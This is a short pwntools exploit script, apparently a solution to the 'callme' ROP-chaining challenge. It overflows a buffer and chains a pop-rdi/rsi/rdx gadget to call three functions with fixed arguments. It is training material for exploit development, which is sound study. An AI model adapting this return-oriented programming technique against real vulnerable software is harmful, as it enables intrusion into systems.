#!/root/env/bin/python
from pwn import *
elf = context.binary = ELF("callme")
gdb_cmd = [
    "c"
]
io = process(elf.path)
gdb.attach(io,gdbscript="\n".join(gdb_cmd))

rop_addr = 0x401ab0             # pop rdi; pop rsi; pop rdx; ret;
callme_three = 0x401810
callme_two = 0x401870
callme_one = 0x401850
offset = cyclic_find("kaaalaaa")

exploit = p64(rop_addr)+p64(1)+p64(2)+p64(3)+p64(callme_one)+p64(rop_addr)+p64(1)+p64(2)+p64(3)+p64(callme_two)+p64(rop_addr)+p64(1)+p64(2)+p64(3)+p64(callme_three)

io.sendline("A"*offset+exploit)
io.interactive()